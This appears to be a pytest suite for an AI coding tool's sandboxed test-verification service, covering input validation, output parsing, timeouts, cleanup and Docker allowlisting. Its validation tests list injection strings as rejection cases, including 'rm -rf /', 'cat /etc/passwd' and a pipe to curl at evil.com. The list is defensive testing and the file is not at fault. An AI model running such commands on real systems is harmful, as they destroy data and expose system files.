"""
FirstPatch AI — Phase 3 Test Suite: Isolated Test Execution & Verification

Comprehensive automated tests covering:
- Verification request validation and sanitization
- Command injection and path traversal prevention
- Pytest and Jest test output parsing (accuracy, collection errors, memory bounding)
- State machine lifecycle and invalid transitions
- Isolated execution service workflow with mock driver
- Bounded stdout/stderr truncation (50KB max)
- Timeout enforcement and cancellation handling
- Cleanup guarantees on success, failure, and timeout
- Reality Checker integration adapter (commit SHA binding, stale record detection)
- Docker security boundary configuration and allowlisting
- Verification API endpoints (health, run, query, cancel, session status)
"""
import asyncio
from datetime import datetime, timezone
from uuid import uuid4

import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.schemas import ContributionPlan, ImplementationStep, RepositoryIdentity, RepositoryOverview, TestLocation
from app.schemas.verification import (
    ExecutionStatus,
    RuntimeProfile,
    VALID_TRANSITIONS,
    VerificationRunRecord,
    VerificationRunRequest,
    VerificationTestCounts,
)
from app.services.verification import (
    ALLOWLISTED_IMAGES,
    BaseExecutionDriver,
    DockerExecutionDriver,
    IsolatedVerificationService,
    JestNpmOutputParser,
    MockExecutionDriver,
    PlanTestVerificationStatus,
    PytestOutputParser,
    VerificationRealityAdapter,
    VerificationRecordStore,
)


# ==============================================================================
# 1. Verification Request Validation & Security Tests
# ==============================================================================

class TestVerificationRequestValidation:
    """Tests parameter validation and security hardening of incoming execution requests."""

    def test_valid_request(self):
        req = VerificationRunRequest(
            owner="pallets",
            repo="flask",
            commit_sha="a1b2c3d4e5f67890",
            runtime=RuntimeProfile.PYTHON_PYTEST,
            test_target="tests/test_basic.py",
            timeout_seconds=30,
        )
        assert req.owner == "pallets"
        assert req.repo == "flask"
        assert req.commit_sha == "a1b2c3d4e5f67890"
        assert req.test_target == "tests/test_basic.py"

    @pytest.mark.parametrize(
        "malicious_target",
        [
            "tests; rm -rf /",
            "tests && cat /etc/passwd",
            "tests | curl http://evil.com",
            "tests `id`",
            "tests $(whoami)",
            "tests\nrm -rf /",
            "tests\r\nid",
            "../tests",
            "tests/../../etc/passwd",
            "/absolute/path/test.py",
            "\\windows\\system32",
        ],
    )
    def test_command_injection_and_path_traversal_rejected(self, malicious_target):
        with pytest.raises(ValueError):
            VerificationRunRequest(
                owner="safe-owner",
                repo="safe-repo",
                commit_sha="abcdef123456",
                test_target=malicious_target,
            )

    @pytest.mark.parametrize(
        "invalid_owner",
        [
            "owner;injection",
            "owner with spaces",
            "owner/slash",
            "$(evil)",
        ],
    )
    def test_invalid_owner_repo_identifiers_rejected(self, invalid_owner):
        with pytest.raises(ValueError):
            VerificationRunRequest(
                owner=invalid_owner,
                repo="safe-repo",
                commit_sha="abcdef123456",
            )

    @pytest.mark.parametrize(
        "invalid_sha",
        [
            "short",  # < 7 characters
            "not_hex_sha_value_here!!!",
            "12345z7890",
            " ",
        ],
    )
    def test_invalid_commit_sha_rejected(self, invalid_sha):
        with pytest.raises(ValueError):
            VerificationRunRequest(
                owner="owner",
                repo="repo",
                commit_sha=invalid_sha,
            )

    def test_timeout_bounds_enforced(self):
        # Min limit is 5s
        with pytest.raises(ValueError):
            VerificationRunRequest(
                owner="owner",
                repo="repo",
                commit_sha="abcdef123456",
                timeout_seconds=2,
            )
        # Max limit is 120s
        with pytest.raises(ValueError):
            VerificationRunRequest(
                owner="owner",
                repo="repo",
                commit_sha="abcdef123456",
                timeout_seconds=300,
            )


# ==============================================================================
# 2. Test Output Parsers Tests
# ==============================================================================

class TestOutputParsers:
    """Verifies that test console outputs are parsed accurately without hallucinated counts."""

    def test_pytest_parse_passing_summary(self):
        stdout = (
            "============================= test session starts ==============================\n"
            "collected 15 items\n\n"
            "tests/test_core.py ...............                                      [100%]\n"
            "============================== 15 passed in 0.45s ==============================="
        )
        counts, error_summary = PytestOutputParser.parse(stdout, "")
        assert counts.collected == 15
        assert counts.passed == 15
        assert counts.failed == 0
        assert counts.errors == 0
        assert error_summary is None

    def test_pytest_parse_mixed_failures(self):
        stdout = (
            "============================= test session starts ==============================\n"
            "collected 5 items\n\n"
            "tests/test_core.py ..F.s                                                 [100%]\n"
            "=================================== FAILURES ===================================\n"
            "__________________________________ test_fail ___________________________________\n"
            "    def test_fail():\n"
            ">       assert 1 == 2\n"
            "E       assert 1 == 2\n"
            "=================== 1 failed, 3 passed, 1 skipped in 0.50s ===================="
        )
        counts, error_summary = PytestOutputParser.parse(stdout, "")
        assert counts.collected == 5
        assert counts.passed == 3
        assert counts.failed == 1
        assert counts.skipped == 1
        assert counts.errors == 0
        assert error_summary is not None
        assert "assert 1 == 2" in error_summary

    def test_pytest_parse_collection_error(self):
        stdout = (
            "============================= test session starts ==============================\n"
            "collected 0 items / 1 error\n\n"
            "==================================== ERRORS ====================================\n"
            "___________________ ERROR collecting tests/test_syntax.py ______________________\n"
            "ImportError: cannot import name 'broken' from 'app'\n"
            "============================== 1 error in 0.08s ================================="
        )
        counts, error_summary = PytestOutputParser.parse(stdout, "")
        assert counts.errors == 1
        assert counts.failed == 0
        assert error_summary is not None
        assert "ImportError" in error_summary

    def test_pytest_empty_output_does_not_invent_numbers(self):
        counts, error_summary = PytestOutputParser.parse("", "")
        assert counts.collected == 0
        assert counts.passed == 0
        assert counts.failed == 0
        assert counts.errors == 0

    def test_jest_parse_summary(self):
        stdout = (
            "PASS src/index.test.ts\n"
            "FAIL src/utils.test.ts\n"
            "  ● testUtils › format()\n"
            "    Expected: 'hello'\n"
            "    Received: 'world'\n\n"
            "Test Suites: 1 failed, 1 passed, 2 total\n"
            "Tests:       1 failed, 1 skipped, 4 passed, 6 total\n"
            "Snapshots:   0 total\n"
            "Time:        1.25 s\n"
        )
        counts, error_summary = JestNpmOutputParser.parse(stdout, "")
        assert counts.collected == 6
        assert counts.passed == 4
        assert counts.failed == 1
        assert counts.skipped == 1
        assert error_summary is not None
        assert "Expected: 'hello'" in error_summary


# ==============================================================================
# 3. State Machine & Execution Service Workflow Tests
# ==============================================================================

class TestIsolatedVerificationServiceWorkflow:
    """Verifies state machine transitions, timeout, bounding, and cleanup in the service."""

    @pytest.mark.asyncio
    async def test_successful_run_workflow(self):
        store = VerificationRecordStore()
        mock_driver = MockExecutionDriver(is_available=True, default_scenario="pass")
        service = IsolatedVerificationService(driver=mock_driver, store=store)

        req = VerificationRunRequest(
            owner="test-org",
            repo="test-repo",
            commit_sha="1234567890abcdef",
            runtime=RuntimeProfile.PYTHON_PYTEST,
            test_target="tests",
        )

        record = await service.execute_verification(req)
        assert record.status == ExecutionStatus.PASSED
        assert record.exit_code == 0
        assert record.counts is not None
        assert record.counts.passed == 3
        assert record.cleanup_performed is True
        assert len(mock_driver.cleaned_workspaces) == 1

        # Check record in store
        stored = store.get(record.run_id)
        assert stored is not None
        assert stored.status == ExecutionStatus.PASSED

    @pytest.mark.asyncio
    async def test_failing_run_workflow(self):
        store = VerificationRecordStore()
        mock_driver = MockExecutionDriver(is_available=True, default_scenario="fail")
        service = IsolatedVerificationService(driver=mock_driver, store=store)

        req = VerificationRunRequest(
            owner="test-org",
            repo="test-repo",
            commit_sha="1234567890abcdef",
            runtime=RuntimeProfile.PYTHON_PYTEST,
        )

        record = await service.execute_verification(req)
        assert record.status == ExecutionStatus.FAILED
        assert record.exit_code == 1
        assert record.counts.failed == 1
        assert record.error_summary is not None
        assert record.cleanup_performed is True

    @pytest.mark.asyncio
    async def test_collection_error_workflow(self):
        store = VerificationRecordStore()
        mock_driver = MockExecutionDriver(is_available=True, default_scenario="collection_error")
        service = IsolatedVerificationService(driver=mock_driver, store=store)

        req = VerificationRunRequest(
            owner="test-org",
            repo="test-repo",
            commit_sha="1234567890abcdef",
        )

        record = await service.execute_verification(req)
        assert record.status == ExecutionStatus.FAILED
        assert record.counts.errors == 1
        assert "ModuleNotFoundError" in record.error_summary
        assert record.cleanup_performed is True

    @pytest.mark.asyncio
    async def test_timeout_workflow(self):
        store = VerificationRecordStore()
        mock_driver = MockExecutionDriver(is_available=True, default_scenario="timeout")
        service = IsolatedVerificationService(driver=mock_driver, store=store)

        req = VerificationRunRequest(
            owner="test-org",
            repo="test-repo",
            commit_sha="1234567890abcdef",
            timeout_seconds=10,
        )

        record = await service.execute_verification(req)
        assert record.status == ExecutionStatus.TIMED_OUT
        assert record.exit_code == -1
        assert "timed out" in record.error_summary.lower()
        assert record.cleanup_performed is True

    @pytest.mark.asyncio
    async def test_oversized_output_is_bounded_to_50kb(self):
        store = VerificationRecordStore()
        mock_driver = MockExecutionDriver(is_available=True, default_scenario="oversized_output")
        service = IsolatedVerificationService(driver=mock_driver, store=store)

        req = VerificationRunRequest(
            owner="test-org",
            repo="test-repo",
            commit_sha="1234567890abcdef",
        )

        record = await service.execute_verification(req)
        # Bounded to MAX_OUTPUT_BYTES (50KB = 51200 bytes)
        assert len(record.stdout) <= 50 * 1024
        assert "[... OUTPUT TRUNCATED AT 50KB BOUNDARY ...]" in record.stdout

    @pytest.mark.asyncio
    async def test_unavailable_runtime_reports_honest_status_without_host_execution(self):
        store = VerificationRecordStore()
        mock_driver = MockExecutionDriver(is_available=False)
        service = IsolatedVerificationService(driver=mock_driver, store=store)

        req = VerificationRunRequest(
            owner="test-org",
            repo="test-repo",
            commit_sha="1234567890abcdef",
        )

        record = await service.execute_verification(req)
        assert record.status == ExecutionStatus.UNAVAILABLE
        assert "unavailable" in record.error_summary.lower()
        # Ensure driver execute was never called
        assert len(mock_driver.executed_requests) == 0

    @pytest.mark.asyncio
    async def test_cancellation_marks_cancelled(self):
        store = VerificationRecordStore()
        mock_driver = MockExecutionDriver(is_available=True)
        service = IsolatedVerificationService(driver=mock_driver, store=store)

        # Seed a queued record
        record = VerificationRunRecord(
            owner="org",
            repo="repo",
            commit_sha="abcdef123456",
            runtime=RuntimeProfile.PYTHON_PYTEST,
            test_target="tests",
            status=ExecutionStatus.QUEUED,
        )
        store.save(record)

        cancelled = service.cancel_run(record.run_id)
        assert cancelled is True
        updated = store.get(record.run_id)
        assert updated.status == ExecutionStatus.CANCELLED

    def test_state_machine_transition_rules(self):
        # Terminal states must have no valid outgoing transitions
        terminal_states = [
            ExecutionStatus.PASSED,
            ExecutionStatus.FAILED,
            ExecutionStatus.TIMED_OUT,
            ExecutionStatus.BLOCKED,
            ExecutionStatus.UNSUPPORTED,
            ExecutionStatus.UNAVAILABLE,
            ExecutionStatus.CANCELLED,
        ]
        for term in terminal_states:
            assert len(VALID_TRANSITIONS[term]) == 0


def _make_overview(owner="owner", repo="repo", commit_sha=None, test_locations=None) -> RepositoryOverview:
    ident = RepositoryIdentity(owner=owner, repo=repo)
    return RepositoryOverview(
        identity=ident,
        full_name=ident.full_name,
        github_url=ident.github_url,
        commit_sha=commit_sha,
        test_locations=test_locations or [],
    )


# ==============================================================================
# 4. Reality Checker Verification Adapter Tests
# ==============================================================================

class TestRealityCheckerVerificationAdapter:
    """Verifies binding of test claims to genuine snapshot verification records."""

    def test_verified_passed_with_matching_commit_sha(self):
        store = VerificationRecordStore()
        commit_sha = "abcdef1234567890"

        # Save an authentic passed record
        run_record = VerificationRunRecord(
            owner="owner",
            repo="repo",
            commit_sha=commit_sha,
            runtime=RuntimeProfile.PYTHON_PYTEST,
            test_target="tests",
            status=ExecutionStatus.PASSED,
            counts=VerificationTestCounts(collected=5, passed=5, failed=0),
        )
        store.save(run_record)

        adapter = VerificationRealityAdapter(store=store)

        plan = ContributionPlan(
            owner="owner",
            repo="repo",
            issue_number=42,
            issue_title="Bug in calculation",
            issue_url="https://github.com/owner/repo/issues/42",
            summary="Fix bug",
            implementation_steps=[
                ImplementationStep(order=1, description="Edit code", rationale="Fix edge case", relevant_files=["app.py"]),
                ImplementationStep(order=2, description="Run tests to verify fix", rationale="Ensure no regression", relevant_files=["tests/test_app.py"]),
            ],
        )
        overview = _make_overview(
            owner="owner",
            repo="repo",
            commit_sha=commit_sha,
            test_locations=[TestLocation(path="tests", framework="pytest")],
        )

        assessment = adapter.assess_plan_test_claims(plan, overview)
        assert assessment.status == PlanTestVerificationStatus.TESTS_VERIFIED_PASSED
        assert assessment.is_backed_by_evidence is True
        assert assessment.passed_count == 5
        assert assessment.matched_run_id == run_record.run_id

        # Reconcile plan
        reconciled = adapter.reconcile_plan_with_verification(plan, assessment)
        test_step = [s for s in reconciled.implementation_steps if s.order == 2][0]
        assert test_step.is_verified is True
        assert "[Verified in Sandbox]" in test_step.description

    def test_stale_commit_sha_mismatch_detected(self):
        store = VerificationRecordStore()
        old_commit_sha = "1111111111111111"
        current_commit_sha = "2222222222222222"

        # Record exists only for old commit SHA
        old_record = VerificationRunRecord(
            owner="owner",
            repo="repo",
            commit_sha=old_commit_sha,
            runtime=RuntimeProfile.PYTHON_PYTEST,
            test_target="tests",
            status=ExecutionStatus.PASSED,
        )

        adapter = VerificationRealityAdapter(store=store)
        plan = ContributionPlan(
            owner="owner",
            repo="repo",
            issue_number=42,
            issue_title="Bug in calculation",
            issue_url="https://github.com/owner/repo/issues/42",
            summary="Fix bug",
        )
        overview = _make_overview(
            owner="owner",
            repo="repo",
            commit_sha=current_commit_sha,
            test_locations=[TestLocation(path="tests", framework="pytest")],
        )

        assessment = adapter.assess_plan_test_claims(plan, overview, explicit_record=old_record)
        assert assessment.status == PlanTestVerificationStatus.TESTS_STALE_RECORD
        assert assessment.is_backed_by_evidence is False
        assert "stale" in assessment.warnings[0].lower()

    def test_discovered_tests_not_executed_is_distinguished(self):
        store = VerificationRecordStore()
        adapter = VerificationRealityAdapter(store=store)

        plan = ContributionPlan(
            owner="owner",
            repo="repo",
            issue_number=42,
            issue_title="Bug in calculation",
            issue_url="https://github.com/owner/repo/issues/42",
            summary="Fix bug",
            implementation_steps=[
                ImplementationStep(order=1, description="Fix code", rationale="Correct logic", relevant_files=["app.py"]),
                ImplementationStep(order=2, description="Claim that tests passed without running", rationale="Assumes pass", relevant_files=["tests/test_app.py"]),
            ],
        )
        overview = _make_overview(
            owner="owner",
            repo="repo",
            commit_sha="abcdef123456",
            test_locations=[TestLocation(path="tests", framework="pytest")],
        )

        assessment = adapter.assess_plan_test_claims(plan, overview)
        assert assessment.status == PlanTestVerificationStatus.TESTS_DISCOVERED_NOT_EXECUTED
        assert assessment.is_backed_by_evidence is False

        # Verify claims are neutralized
        reconciled = adapter.reconcile_plan_with_verification(plan, assessment)
        assert any("Test verification notice" in u or "not been executed" in u for u in reconciled.uncertainties)


# ==============================================================================
# 5. Docker Security Boundary & Allowlist Configuration Tests
# ==============================================================================

class TestDockerSecurityBoundaryConfiguration:
    """Verifies that Docker configurations meet security restrictions."""

    def test_allowlisted_images_are_strict(self):
        # Only explicitly approved runtime images allowed
        for profile, image in ALLOWLISTED_IMAGES.items():
            assert ":" in image
            assert "latest" not in image  # pinned tag
            assert any(rt in image for rt in ["python", "node"])

    def test_docker_driver_reports_unavailable_gracefully_when_missing(self):
        driver = DockerExecutionDriver()
        # On host without Docker, check_availability returns safe unavailable status
        health = driver.check_availability()
        assert health.host_execution_permitted is False
        if not health.runtime_available:
            assert "unavailable" in health.message.lower() or "not installed" in health.message.lower()


# ==============================================================================
# 6. Verification API Endpoints Tests
# ==============================================================================

class TestVerificationAPIEndpoints:
    """Tests FastAPI router endpoints with dependency injection."""

    def test_get_verification_health_endpoint(self):
        client = TestClient(app)
        res = client.get("/api/verification/health")
        assert res.status_code == 200
        data = res.json()
        assert "runtime_available" in data
        assert "isolation_level" in data
        assert "supported_profiles" in data
        assert data["host_execution_permitted"] is False

    def test_submit_run_with_unavailable_runtime_returns_structured_unavailable(self):
        client = TestClient(app)
        payload = {
            "owner": "pytest-dev",
            "repo": "pytest",
            "commit_sha": "a1b2c3d4e5f67890",
            "runtime": "python_pytest",
            "test_target": "testing/test_runner.py",
            "timeout_seconds": 30,
        }
        res = client.post("/api/verification/run", json=payload)
        # Should return 202 with structured record
        assert res.status_code == 202
        data = res.json()
        assert data["owner"] == "pytest-dev"
        assert data["repo"] == "pytest"
        assert data["status"] in ["unavailable", "queued", "running", "passed"]

    def test_get_run_not_found(self):
        client = TestClient(app)
        non_existent_id = uuid4()
        res = client.get(f"/api/verification/runs/{non_existent_id}")
        assert res.status_code == 404

    def test_get_session_verification_status(self):
        client = TestClient(app)
        session_id = uuid4()
        res = client.get(f"/api/verification/{session_id}")
        assert res.status_code == 200
        data = res.json()
        assert data["session_id"] == str(session_id)
        assert "checks" in data
        assert any(c["name"] == "test_suite" for c in data["checks"])
